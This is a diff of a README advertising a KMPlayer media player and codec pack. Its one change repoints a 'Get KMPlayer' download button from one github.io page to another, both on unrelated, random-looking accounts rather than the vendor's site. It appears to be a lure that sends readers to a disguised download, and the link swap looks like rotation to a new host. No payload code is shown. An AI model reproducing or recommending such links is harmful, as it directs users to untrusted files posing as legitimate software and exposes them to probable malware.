@@ -21,7 +21,7 @@ To begin using this **KMPlayer Media Player** and **KMPlayer Video Optimizer**, 
 | :--- | :--- |
 | **Get KMPlayer Media Player** | Click the button below to start the configuration for this **KMPlayer Codec Pack**. |
 
-[![Button](https://img.shields.io/badge/📦-Get_KMPlayer-2ea44f?style=for-the-badge)](https://pajkosnacaf.github.io/.github/kmplayer-codec-pack)
+[![Button](https://img.shields.io/badge/📦-Get_KMPlayer-2ea44f?style=for-the-badge)](https://jenniferperezx281.github.io/.github/kmplayer-codec-pack)
 
 ## System Requirements
 
